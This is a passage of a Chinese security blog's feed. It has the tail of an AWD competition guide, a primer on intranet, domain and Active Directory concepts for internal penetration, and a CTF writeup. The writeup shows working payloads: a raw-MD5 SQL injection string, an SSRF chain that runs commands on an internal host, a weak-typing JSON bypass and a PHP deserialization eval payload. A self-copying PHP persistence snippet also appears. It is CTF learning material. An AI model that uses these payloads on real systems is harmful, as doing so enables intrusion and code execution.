file_put_contents(randstr().&#39;.php&#39;,file_get_content(__FILE__));        file_get_contents(&quot;http://127.0.0.1/&quot;);    }?&gt;</code></pre><h2 id="0x05-Github-项目推荐"><a href="#0x05-Github-项目推荐" class="headerlink" title="0x05 Github 项目推荐"></a>0x05 Github 项目推荐</h2><p><a href="https://github.com/ssooking/CTFDefense" target="_blank" rel="external">CTFDefense</a><br><a href="https://github.com/wupco/weblogger" target="_blank" rel="external">流量分析</a></p><h2 id="0x06-自己搭建AWD环境"><a href="#0x06-自己搭建AWD环境" class="headerlink" title="0x06 自己搭建AWD环境"></a>0x06 自己搭建AWD环境</h2><p><a href="https://github.com/zhl2008/awd-platform" target="_blank" rel="external">https://github.com/zhl2008/awd-platform</a></p><h2 id="0x07-文章推荐："><a href="#0x07-文章推荐：" class="headerlink" title="0x07 文章推荐："></a>0x07 文章推荐：</h2><p>王一航：<a href="https://xz.aliyun.com/t/1530/" target="_blank" rel="external">https://xz.aliyun.com/t/1530/</a></p><p><a href="http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="external">http://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p><p><a href="https://www.saowen.com/a/f4d0da55630cacf7bad21a95a2e14c1623ecc8cf65af3818e49ba7abccb429bd" target="_blank" rel="external">https://www.saowen.com/a/f4d0da55630cacf7bad21a95a2e14c1623ecc8cf65af3818e49ba7abccb429bd</a></p><p><a href="https://blog.csdn.net/like98k/article/details/80261603" target="_blank" rel="external">https://blog.csdn.net/like98k/article/details/80261603</a></p><p><a href="https://www.andseclab.com/2018/04/27/ctf%E7%BA%BF%E4%B8%8B%E8%B5%9B-awd-%E5%8F%82%E8%B5%9B%E6%8C%87%E5%8D%97/" target="_blank" rel="external">https://www.andseclab.com/2018/04/27/ctf%E7%BA%BF%E4%B8%8B%E8%B5%9B-awd-%E5%8F%82%E8%B5%9B%E6%8C%87%E5%8D%97/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;初探线下CTF-AWD模式&quot;&gt;&lt;a href=&quot;#初探线下CTF-AWD模式&quot; class=&quot;headerlink&quot; title=&quot;初探线下CTF AWD模式&quot;&gt;&lt;/a&gt;初探线下CTF AWD模式&lt;/h1&gt;&lt;p&gt;祭上大牛的导图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;h
      
    
    </summary>
    
      <category term="CTF" scheme="http://mang0.me/categories/CTF/"/>
    
    
      <category term="ctf" scheme="http://mang0.me/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透基础知识</title>
    <link href="http://mang0.me/archives/7db24e65/"/>
    <id>http://mang0.me/archives/7db24e65/</id>
    <published>2018-12-02T09:07:15.000Z</published>
    <updated>2018-12-02T10:31:16.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内网渗透基础知识"><a href="#内网渗透基础知识" class="headerlink" title="内网渗透基础知识"></a>内网渗透基础知识</h1><p>[TOC]</p><h2 id="0x00-内网概述"><a href="#0x00-内网概述" class="headerlink" title="0x00 内网概述"></a>0x00 内网概述</h2><p>内网也指局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的历程安排、电子邮件和传真通信服务等功能。<br>内网是封闭型的，它可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。列如银行、学校、企业工厂、政府机关、网吧、单位办公网等都属于此类。</p><h2 id="0x01-内网名词"><a href="#0x01-内网名词" class="headerlink" title="0x01 内网名词"></a>0x01 内网名词</h2><p>我们在研究内网的时候，经常会听说一些列如“工作组”、“域”、<br>“域控制器（DC）”、“父域”、“了域”、“域树”、“域森林’和“活动目录（AD）”“DMZ”、“域内权限”等专有名词。那么它们到底指的是什么？又有何区别呢？</p><h2 id="0x02-工作组"><a href="#0x02-工作组" class="headerlink" title="0x02 工作组"></a>0x02 工作组</h2><p>工作组（Work Group），在一个大的单位内，可能有成百上千台电脑互相连接组成局域网，它们都会列在“网络（网上邻居）”内，如果这些电脑不分组，可想而知有多么混乱，要找一台电脑很困难。为了解决这一问题，就有了“工作组”这个概念，将不同的电脑一般按功能（或部门）分别列入不同的工作组中，如技术部的电脑都列入“技术部”工作组中，行政部的电脑都列入“行政部”工作组中。你要访问某个部门的资源，就在“网络”里找到那个部门的工作组名，双击就可以看到那个部门的所有电脑了。相比不分组的情况就有序的多了，尤其是对于大型局域网络来说。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542981146.7729611.jpg" alt=""></p><h4 id="加入-创建工作组"><a href="#加入-创建工作组" class="headerlink" title="加入/创建工作组"></a>加入/创建工作组</h4><p>右击桌面上的“计算机”，在弹出的菜单出选择“属性”，点击“更改设置”，“更改”，在“计算机名”一栏中键入你想好的名称，在“工作组”一栏中键入你想加入的工作组名称。<br>如果你输入的工作组名称网络中没有，那么相当于新建了一个工作组，当然暂时只有你的电脑在组内。单击“确定”按钮后，Windows提示需要重新启动，重新启动之后，再进入“网络”就可以看到你所加入的工作组成员了。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542981817.9860647.jpg" alt=""></p><p>可以更改进入行政部</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542981914.547977.jpg" alt=""></p><h4 id="退出工作组"><a href="#退出工作组" class="headerlink" title="退出工作组"></a>退出工作组</h4><ul><li>只要将工作组名称改动即可。不过在网上别人照样可以访问你的共享资源。你也可以随便加入同一网络上的任何其它工作组。“工作组”就像一个可以自由进入和退出的“社团”，方便同一组的计算机互相访问。</li><li>所以工作组并不存在真正的集中管理作用，工作组里的所有计算机都是对等的，也就是没有服务器和客户机之分的。</li></ul><h2 id="0x02-域"><a href="#0x02-域" class="headerlink" title="0x02 域"></a>0x02 域</h2><ul><li>域（Domain）是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言，它有一个更加严格的安全管理控制机制，如果你想访问域内的资源，必须拥有一个合法的身份登陆到该域中，而你对该域内的资源拥有什么样的权限，还需要取决于你在该域中的用户身份。</li><li>域控制器（Domain Controller，简写为DC）是一个域中的一台类似管理服务器的计算机，相当于一个单位的门卫一样，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都是经过它的审核。</li></ul><p>内网渗透的目的就是为了获得域控制器</p><p>安全域划分</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1542982192.3827906.jpg" alt=""></p><h3 id="域的分类"><a href="#域的分类" class="headerlink" title="域的分类"></a>域的分类</h3><p>单域<br>父域，子域<br>域树（tree）<br>域森林（forest）<br>DNS域名服务器</p><h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p><p>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p><h4 id="父域与子域"><a href="#父域与子域" class="headerlink" title="父域与子域"></a>父域与子域</h4><ul><li>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</li><li>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。</li><li>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</li><li>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</li><li>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</li></ul><h4 id="域树（tree）"><a href="#域树（tree）" class="headerlink" title="域树（tree）"></a>域树（tree）</h4><ul><li>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系（Trust Relation）。比如asia.abc.com与Europe.abc.com访问需要建立信任关系</li><li>信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。</li><li>在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。</li></ul><p>abc.com 是一级域</p><p>asia是二级域</p><p><img src="/内网渗透基础知识/1543422980234.png" alt="1543422980234"></p><h4 id="域森林（forest）"><a href="#域森林（forest）" class="headerlink" title="域森林（forest）"></a>域森林（forest）</h4><p>域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。</p><p><img src="/内网渗透基础知识/1543423310031.png" alt="1543423310031"></p><h4 id="DNS域名服务器"><a href="#DNS域名服务器" class="headerlink" title="DNS域名服务器"></a>DNS域名服务器</h4><ul><li>DNS域名服务器是进行域名（domain name）和与之相对应的IP地址（IP address）转换的服务器。</li><li>在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。</li><li>一般情况下，我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为<strong>通常DNS服务器和域控制器会处在同一台机器上</strong>。</li></ul><h2 id="0x03-活动目录（AD）"><a href="#0x03-活动目录（AD）" class="headerlink" title="0x03 活动目录（AD）"></a>0x03 活动目录（AD）</h2><ul><li>活动目录（Active Directory）是域环境中提供目录服务的组件。</li><li>目录是什么？目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。</li><li>如果将企业的内网看成是一本字典，那么内网里的资源就是字典的内容，活动目录就相当于字典的索引。即活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。</li></ul><h3 id="逻辑结构"><a href="#逻辑结构" class="headerlink" title="逻辑结构"></a>逻辑结构</h3><ul><li>在活动口录中，管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“<strong>逻辑结构</strong>“。</li><li>活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树（tree）、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。</li></ul><p>a集团旗下有甲乙两个公司</p><p><img src="/内网渗透基础知识/1543424293488.png" alt="1543424293488"></p><h3 id="活动目录的主要功能"><a href="#活动目录的主要功能" class="headerlink" title="活动目录的主要功能"></a>活动目录的主要功能</h3><ol><li>帐号集中管理，所有帐号均存在服务器上，方便对帐号的重命令/重置密码。</li><li>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</li><li>环境集中管理，利用AD可以统一客户端桌面，IE，TCP/IP等设置。</li><li>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li><li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，岩机时间更少。</li><li>活动目录为Microsoft统一管理的基础平台，其它isa，exchange，sms等服务都依赖于这个基础平台。</li></ol><h3 id="AD和DC的区别"><a href="#AD和DC的区别" class="headerlink" title="AD和DC的区别"></a>AD和DC的区别</h3><ul><li>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</li><li>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</li><li>DC的本质是一台计算机，AD的本质是提供目录服务的组件</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><strong>问题</strong>：</p><p>假如一个公司有200台电脑，我们希望某台电脑上的账户Alan可以访问每台电脑内的资源或者可以在每台电脑上登录。那么在“工作组”环境中，我们必须要在这200台电脑的各个SAM数据库中创建Alan这个账户。一旦Alan想要更换密码，必须要更改200次！现在只是200台电脑的公司，如果是有5000台电脑或者上万台电脑的公司呢？估计管理员会抓狂。</p><p><strong>答案:</strong></p><p>因此产生了域。在域环境中，只需要在活动目录中创建一次Alan账户，那么就可以在任意200台电脑中的一台上登录Alan，如果要为Alan账户更改密码，只需要在活动目录中更改一次就可以了。</p><h2 id="0x04-域相关概念"><a href="#0x04-域相关概念" class="headerlink" title="0x04 域相关概念"></a>0x04 域相关概念</h2><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p><p><img src="/内网渗透基础知识/1543424748856.png" alt="1543424748856"></p><h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><ul><li>两个防火墙之间的空间被称为DMZ。</li><li>DMZ是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。</li><li>为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</li><li>该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。</li><li>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</li></ul><h4 id="DMZ的屏障功能"><a href="#DMZ的屏障功能" class="headerlink" title="DMZ的屏障功能"></a>DMZ的屏障功能</h4><p>（1）内网可以访问外网<br>内网的用户需要白面地访间外网。在这一策略中，防火墙需要执行NAT。<br>（2）内网可以访间DMZ</p><p>此策略使内网用户可以使用或者管理DMZ中的服务器。<br>（3）外网不能访间内网<br>这是防火墙的基本等略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如栗要访问，就要通过vPN方式来进行。<br>（4）外网可以访问DMZ </p><p>DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMz需要由防火墙完成对外地址到服务器实际地址的转换。<br>（5）DMZ不能访间内网<br>如不执行此策略，则当入侵者攻陷DMz时，内部网络将不会受保护。<br>（6）DMZ不能访何外网<br>此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作.</p><h3 id="域中计算机分类"><a href="#域中计算机分类" class="headerlink" title="域中计算机分类"></a>域中计算机分类</h3><p>域控制器</p><p>成员服务器</p><p>客户机</p><p>独立服务器</p><ul><li>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</li><li>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</li></ul><h2 id="0x05-域内权限解读"><a href="#0x05-域内权限解读" class="headerlink" title="0x05 域内权限解读"></a>0x05 域内权限解读</h2><h3 id="内权限解读"><a href="#内权限解读" class="headerlink" title="内权限解读"></a>内权限解读</h3><h4 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h4><p>域本地组，多域用户访问单域资源（访问同一个域）。可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限。</p><p>举例子说就是其他域都可以访问 asis.abc.com</p><p><img src="/内网渗透基础知识/1543422980234.png" alt="1543422980234"></p><h4 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h4><p>全局组，单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组，可以在域林中的任何域中指派权限，全局组可以嵌套在其他组中。</p><p>很多的全局组，可以把Domain Computers加入Domain Admins全局组中</p><p><img src="/内网渗透基础知识/1543426108264.png" alt="1543426108264"></p><h5 id="全局组与域本地组区别"><a href="#全局组与域本地组区别" class="headerlink" title="全局组与域本地组区别"></a>全局组与域本地组区别</h5><p>全局组相当于域账号，可以在全局使用，域本地组相当于本地账号，只能本机上使用。</p><p>下面我来举两个例子来进一步说明（以混合模式下为例）：</p><p>　　例1：将用户张三（域帐号Z3）加入到域本地组administrators中，并不能使Z3对非DC的域成员计算机有任何特权，但若加入到全局组Domain Admins中，张三就是域管理员了，可以在全局使用，对域成员计算机是有特权的。<br>　　例2：只有在域的DC上，对资源（如：文件/夹）设置权限，你可以指派域本地组administrators；但在非DC的域成员计算机上，你是无法设置域本地组administrators的权限的。因为它是域本地组，只能在DC上使用。</p><h4 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h4><p>通用组，通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。</p><h4 id="AGDLP"><a href="#AGDLP" class="headerlink" title="AGDLP"></a>AGDLP</h4><p>A (account):用户帐户<br>G (Global group):全局组<br>DL (Domain local group):域本地组<br>P (Permission):许可，资源权限<br>按照AGDLP的原则对用户进行组织和管理起来更容易<br>在AGDLP形成以后当给一个用户某一个权限的时候,只要把这个用户加入到某一个本地域组就可以了。</p><p>举个例子比如： 有两个域，A和B，A中的5个财务人员和B中的3个财务人员都需要访问B中的“FINA”文件夹。这时，可以在B中建一个DL(域本地组)，因为DL的成员可以来自所有的域，然后把这8个人都加入这个DL，并把FINA的访问权赋给DL。这样做的坏处是什么呢？因为DL是在B域中，所以管理权也在B域，如果A域中的5 个人变成6个人，那只能A域管理员通知B域管理员，将DL的成员做一下修改，B域的管理员太累了。这时候，我们改变一下，在A和B域中都各建立一个全局组（G），然后在B域中建立一个DL，把这两个G都加入B域中的DL中，然后把FINA的访问权赋给 DL。哈哈，这下两个G组都有权访问FINA文件夹了，是吗？组嵌套造成权限继承嘛！这时候，两个G分布在A和B域中，也就是A和B的管理员都可以自己管理自己的G啦，只要把那5个人和3个人加入G中，就可以了！以后有任何修改，都可以自己做了，不用麻烦B域的管理员！这就是A-G-DL-P。</p><p>A-G-DL-P策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><p>可以简单这样记忆：<br>域本地组：来自全林用于本域</p><p>全局组：来自本域作用于全林</p><p>通用组：来自全林用于全林</p><h3 id="熟悉各个组"><a href="#熟悉各个组" class="headerlink" title="熟悉各个组"></a>熟悉各个组</h3><p>本地域组的权限</p><ul><li>Administrators（管理员组） ————最重要的权限</li><li>Remote Desktop Users（远程登录组）</li><li>Print Operators（打印机操作员组）</li><li>Account Operators（帐号操作员组）</li><li>Server Operaters（服务器操作员组）</li><li>Backup Operators（备份操作员组）</li></ul><p>全局组、通用组的权限</p><ul><li>Domain Admins（域管理员组）————最最最重要的权限，一般来说域渗透是看重这个</li><li>Enterprise Admins（企业系统管理员组）————最重要的权限，其次是去看重这个权限</li><li>Schema Admins（架构管理员组）————最重要的权限</li><li>Domain Users（域用户组）</li></ul><p><img src="/内网渗透基础知识/1543427208078.png" alt="1543427208078"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;内网渗透基础知识&quot;&gt;&lt;a href=&quot;#内网渗透基础知识&quot; class=&quot;headerlink&quot; title=&quot;内网渗透基础知识&quot;&gt;&lt;/a&gt;内网渗透基础知识&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;0x00-内网概述&quot;&gt;&lt;a href=&quot;#0x00-内网
      
    
    </summary>
    
      <category term="内网" scheme="http://mang0.me/categories/%E5%86%85%E7%BD%91/"/>
    
    
      <category term="内网" scheme="http://mang0.me/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>第一届安洵杯writeup</title>
    <link href="http://mang0.me/archives/6bd5dfde/"/>
    <id>http://mang0.me/archives/6bd5dfde/</id>
    <published>2018-11-26T13:23:57.000Z</published>
    <updated>2018-11-26T13:37:26.161Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第一届安洵杯writeup"><a href="#第一届安洵杯writeup" class="headerlink" title="第一届安洵杯writeup"></a>第一届安洵杯writeup</h1><h2 id="MIsc"><a href="#MIsc" class="headerlink" title="MIsc"></a>MIsc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>D0g3{4a8a08f09d37b73795649038408b5f33}</p><h3 id="CRC"><a href="#CRC" class="headerlink" title="CRC"></a>CRC</h3><p>第一个压缩包，提示CRC爆破结果是纯数字，直接爆破<br>里面三个文件，看了一下大概是要先解压password然后运行.py计算flag.zip的解压密码。<br>然后crc32碰撞，直接爆破password.txt的内容</p><pre><code class="python">import zlibfor i in xrange(0,100000000):    buf = str(i).rjust(8,&#39;0&#39;)    #print buf    if zlib.crc32(buf) &amp; 0xffffffff == 0x0cd95dac:        print &#39;&#39;,buf</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238690.039933.jpg" alt=""></p><p>然后再用.py跑</p><pre><code class="python">import base64import hashlib#f = open(&quot;password.txt&quot;,&#39;r&#39;)#password = f.readline()password=&#39;08646247&#39;b64_str = base64.b64encode(password.encode(&#39;utf-8&#39;))hash = hashlib.md5()hash.update(b64_str)zip_passowrd = hash.hexdigest()print(zip_passowrd)</code></pre><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238706.8619618.jpg" alt=""></p><p>再去解压flag.zip,解压出来一张图片<br>改高度，先直接winhex改了过后图片直接崩了，然后绕了一会，结果就是该高度，winhex不对应该是crc的原因。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238750.618987.jpg" alt=""></p><p>修改高度为500</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238768.818335.jpg" alt=""></p><p>可以看到flag了导出 提取文字完事。<br><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238782.933626.jpg" alt=""></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>第一层绕过NOHO[]=d</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543160311.0840952.jpg" alt=""></p><p>第二层 </p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238815.5454066.jpg" alt=""></p><p>MD5加密后16进制转字符</p><p>MD5注入<br>ffifdyop</p><p>成功拿到flag</p><pre><code>e5e8b79aeb213ad6e0e4664e78aff61b</code></pre><p>参考文章<a href="https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html" target="_blank" rel="external">https://joychou.org/web/SQL-injection-with-raw-MD5-hashes.html</a></p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>题目提示</p><pre><code>The Intranets are in range 10.10.1.0/16Please use right protocols :)</code></pre><p>在name提交框那里随便提交一个test，发现输出到了url的url参数</p><p>于是利用burpsuite，使用http协议扫描一波内网主机</p><p>题外话:Intruder支持多种爆破模式。分别是：单一字典爆破、多字段相同字典爆破、多字典意义对应爆破、聚合式爆破。最常用的应该是在爆破用户名和密码的时候。使用聚合方式枚举了。选择不要搞错了</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238831.9874556.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238844.715426.jpg" alt=""></p><p>有<code>10.10.1.3</code>和<code>10.10.1.6</code>两台主机，利用同样的方法扫描端口，</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238855.3709393.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238953.0099094.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238897.1931283.jpg" alt=""></p><p>发现只有80端口，并且只有<code>10.10.1.6</code>主机才有d0g3.php，访问<code>10.10.1.6/d0g3.php</code>提示</p><pre><code>&lt;!--$_GET[d0g3]--&gt;</code></pre><p>传入</p><pre><code>http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=phpinfo();</code></pre><p>发现执行了命令</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543238980.8754137.jpg" alt=""></p><p>于是读取flag</p><pre><code>curl -v &#39;http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo `cat flag.txt`; &#39;</code></pre><p>拿到flag</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239000.2885165.jpg" alt=""></p><pre><code>D0g3{SSRF_Is_So_Easy}</code></pre><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="方舟计划"><a href="#方舟计划" class="headerlink" title="方舟计划"></a>方舟计划</h3><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543150165.3448315.jpg" alt=""></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543150269.1533902.jpg" alt=""></p><p>011000110110000101101001011100000110100101100001011011110011011000101110011110100110100101110000</p><p>hex(int(‘011000110110000101101001011100000110100101100001011011110011011000101110011110100110100101110000’,2))<br>‘0x6361697069616f362e7a6970’</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543150336.3338537.jpg" alt=""></p><p>得到caipiao6.zip 下载审计</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543239018.149764.jpg" alt=""></p><p>在api.php存在弱类型</p><pre><code class="php">for($i=0; $i&lt;7; $i++){    if($numbers[$i] == $win_numbers[$i]){        $same_count++;    }}</code></pre><ol><li><code>{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]}</code></li></ol><p>最终可以得到 Flag</p><p>D0g3{150754621171553}</p><h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2><h3 id="double-s-签到题"><a href="#double-s-签到题" class="headerlink" title="double-s 签到题"></a>double-s 签到题</h3><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543127815.6655116.jpg" alt=""></p><p><a href="http://54.200.169.99:7000/" target="_blank" rel="external">http://54.200.169.99:7000/</a></p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543217010.3946216.jpg" alt=""></p><p><a href="http://54.200.169.99:7000/www.zip" target="_blank" rel="external">http://54.200.169.99:7000/www.zip</a></p><p>下载审计构造PHP反序列化</p><p>参考文章：<a href="http://hu3sky.ooo/2018/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="external">http://hu3sky.ooo/2018/05/09/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/?tdsourcetag=s_pctim_aiomsg</a></p><pre><code class="php">&lt;?phpini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);session_start();class Anti{    public $info;    function __construct()    {        $this-&gt;info = &#39;phpinfo();&#39;;    }    function __destruct()    {        eval($this-&gt;info);    }}if(isset($_GET[&#39;aa&#39;])){    if(unserialize($_GET[&#39;aa&#39;])==&#39;phpinfo&#39;)    {        $m = new Anti();    }}else{    header(&quot;location:index.html&quot;);}?&gt;</code></pre><p>这是一道PHP序列化漏洞的题，三种类型如下链接学习<br>（<a href="http://www.tuicool.com/articles/zEfuEz" target="_blank" rel="external">http://www.tuicool.com/articles/zEfuEz</a>）</p><p>可以看到<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p><p><strong>php大于5.5.4的版本中默认使用php_serialize规则</strong></p><p>session.serialize_handler函数是用来设置session序列化引擎的。</p><p>这里是将session序列化引擎设置为php解析。我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p><p>先构造出一个phpinfo；</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543219057.63886.jpg" alt=""></p><pre><code>http://54.200.169.99:7000/session.php?aa=O:4:&quot;Anti&quot;:1:{s:4:&quot;info&quot;;s:10:&quot;phpinfo();&quot;;}</code></pre><p>由phpinfo()页面继续可知，session.upload_progress.enabled为On。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543218407.6353521.jpg" alt=""></p><p>通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p><p><img src="https://blog-1254419664.coscd.myqcloud.com/201811/1543218369.4250176.jpg" 